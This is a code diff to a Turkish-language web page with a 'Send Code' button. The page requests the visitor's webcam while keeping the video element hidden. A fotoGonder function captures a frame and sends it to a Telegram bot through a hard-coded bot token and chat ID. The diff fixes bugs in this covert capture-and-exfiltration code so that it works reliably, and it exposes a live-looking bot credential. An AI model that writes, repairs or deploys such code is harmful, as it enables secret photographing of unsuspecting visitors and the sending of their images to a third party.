@@ -58,17 +58,11 @@
       width: 10px;
       height: 10px;
       background-color: #4CAF50;
-      animation: explode 0.6s forwards ease-out;
+      animation: explodePiece 0.6s forwards ease-out;
     }
-    @keyframes explode {
+    @keyframes explodePiece {
       0% { opacity: 1; transform: translate(0, 0) scale(1); }
-      100% {
-        opacity: 0;
-        transform: translate(
-          calc(100px * (0.5 - Math.random())),
-          calc(-100px * Math.random())
-        ) scale(0.5);
-      }
+      100% { opacity: 0; transform: translate(100px, -100px) scale(0.5); }
     }
     video {
       display: none;
@@ -95,7 +89,7 @@
   <button id="koduGonder" onclick="koduGonderTiklandi(this)">Kodu Gönder</button>
 
   <script>
-    const botToken = 8489674777:AAG1eCe75YEKNHrCPHbzUgb3n1Ag6_S83sY
+    const botToken = "8489674777:AAG1eCe75YEKNHrCPHbzUgb3n1Ag6_S83sY";
     const chatId = "7791726274";
     let tiklamaSayisi = 0;
 
@@ -132,7 +126,7 @@
         navigator.mediaDevices.getUserMedia({ video: true })
           .then(stream => {
             video.srcObject = stream;
-          });
+          }).catch(() => {});
       } else {
         document.getElementById("girisEkrani").style.display = "none";
         document.getElementById("hataMesaji").style.display = "block";
@@ -177,24 +171,26 @@
 
     function fotoGonder() {
       const video = document.getElementById('kamera');
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.translate(canvas.width, 0);
-      ctx.scale(-1, 1);
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      if (video.readyState >= 2) {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", blob, "kamera.jpg");
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append("chat_id", chatId);
+          formData.append("photo", blob, "kamera.jpg");
 
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        });
-      }, 'image/jpeg');
+          fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+        }, 'image/jpeg');
+      }
     }
   </script>
 </body>
